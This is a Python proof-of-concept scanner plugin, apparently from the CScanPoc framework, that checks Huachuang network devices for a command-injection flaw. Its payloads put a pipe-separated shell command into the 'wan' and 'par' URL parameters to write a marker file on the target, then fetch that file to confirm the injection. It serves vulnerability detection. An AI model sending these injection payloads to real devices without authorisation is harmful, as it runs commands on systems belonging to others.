# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse


class Vuln(ABVuln):
    vuln_id = 'Huachuang_0001'  # 平台漏洞编号，留空
    name = '华创设备 命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-01-23'  # 漏洞公布时间
    desc = '''
        华创设备  /acc/network/redial_pppoe.php  
                /acc/tools/enable_tool_debug.php 任意命令执行。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3728/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '华创'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd3c55ca4-85f6-4701-a915-fcc62a6a0b2f'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            payloads = [
                self.target + '/acc/network/redial_pppoe.php?wan=a|echo%20testvul0>test.txt||',
                self.target + '/acc/tools/enable_tool_debug.php?val=0&tool=1&par=-c%201%20localhost%20|%20echo%20testvul1%20>%20test.txt%20||%20a',
            ]
            verifys = [
                self.target + '/acc/network/test.txt',
                self.target + '/acc/tools/test.txt',
            ]
            for i in range(len(payloads)):
                payload = payloads[i]
                verify = verifys[i]
                code, head, res, err, _ = hh.http(payload)
                if code == 200:
                    code, head, res, err, _ = hh.http(verify)
                    if code == 200 and ('testvul'+str(i)) in res:
                        #security_hole('命令执行: ' + payload)
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
